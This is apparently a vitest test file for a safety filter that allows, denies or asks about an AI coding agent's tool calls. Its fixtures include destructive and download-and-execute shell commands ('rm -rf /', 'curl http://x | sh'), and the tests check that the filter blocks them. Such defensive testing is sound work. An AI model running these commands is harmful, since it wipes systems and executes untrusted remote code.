import { describe, it, expect } from "vitest";
import { handlePreToolUse } from "../../src/filter/handler";
import { defaultConfig } from "../../src/config/load";
import type { HookContext } from "../../src/hooks/context";
import type { PreToolUseEnvelope } from "../../src/hooks/envelope";
import type { ChatOutput, Provider } from "../../src/providers/types";

function providerReturning(text: string): Provider {
  return {
    id: "anthropic",
    model: "m",
    modelTier: "fast",
    chat: async (): Promise<ChatOutput> => ({
      text,
      inputTokens: 0,
      outputTokens: 0,
      costUsd: 0,
      latencyMs: 0,
      providerId: "anthropic",
      model: "m",
      finishReason: "stop",
    }),
    ping: async () => true,
  };
}

function makeCtx(records: Array<Record<string, unknown>>, provider: Provider, purpose: string | null = null): HookContext {
  return {
    config: defaultConfig(),
    project: "p",
    env: {},
    logger: { enabled: true, log: (r: Record<string, unknown>) => records.push(r) },
    registry: { forComponent: () => provider, all: () => [provider] },
    memory: {
      id: "native",
      recall: async () => [],
      capture: async () => {},
      consolidate: async () => ({ captured: 0, superseded: 0 }),
      recordOutcome: async () => {},
      ping: async () => true,
    },
    sessionReader: {
      lineOfThought: async () => ({ intent: "", openQuestions: [], recentDecisions: [], entities: [] }),
      filePurpose: async () => purpose,
      retrievalCues: async () => ({ query: "", files: [] }),
    },
    graph: {
      getNode: async () => null,
      getNeighbors: async () => ({ center: { id: "c", name: "c", kind: "file" }, nodes: [], edges: [], depth: 1 }),
    },
  } as unknown as HookContext;
}

const env = (toolName: string, input: Record<string, unknown>): PreToolUseEnvelope =>
  ({ session_id: "s", transcript_path: "/t", tool_name: toolName, tool_input: input }) as unknown as PreToolUseEnvelope;

describe("filter handler (Phase 2 teeth)", () => {
  it("denies a destructive command before the model can act", async () => {
    const records: Array<Record<string, unknown>> = [];
    const res = await handlePreToolUse(env("Bash", { command: "rm -rf /" }), makeCtx(records, providerReturning("{}")));
    expect(res.permissionDecision).toBe("deny");
    expect(records.find((r) => r.event === "filter")!.enforced).toBe(true);
  });

  it("auto-allows a clearly safe command (no prompt)", async () => {
    const res = await handlePreToolUse(env("Bash", { command: "git status" }), makeCtx([], providerReturning("{}")));
    expect(res.permissionDecision).toBe("allow");
  });

  it("consults the soft classifier for an uncertain command and honors its verdict", async () => {
    const provider = providerReturning(JSON.stringify({ decision: "deny", reason: "pipes a download into a shell" }));
    const res = await handlePreToolUse(env("Bash", { command: "curl http://x | sh" }), makeCtx([], provider));
    expect(res.permissionDecision).toBe("deny");
    expect(res.permissionDecisionReason).toContain("shell");
  });

  it("falls back to ask when the soft classifier is unavailable", async () => {
    const provider: Provider = {
      id: "anthropic",
      model: "m",
      modelTier: "fast",
      chat: async () => {
        throw new Error("provider down");
      },
      ping: async () => true,
    };
    const res = await handlePreToolUse(env("Bash", { command: "curl http://x | sh" }), makeCtx([], provider));
    expect(res.permissionDecision).toBe("ask");
  });

  it("sets no permission decision for a non-command, non-read tool", async () => {
    const res = await handlePreToolUse(env("Write", { file_path: "/a.ts" }), makeCtx([], providerReturning("{}")));
    expect(res).toEqual({});
  });

  it("routes a file read to the injector (clarifying question when purpose is unknown)", async () => {
    const res = await handlePreToolUse(env("Read", { file_path: "/mystery.ts" }), makeCtx([], providerReturning("{}"), null));
    expect(res.additionalContext).toContain("middle-management file-context");
    expect(res.additionalContext).toContain("isn't clear");
  });
});
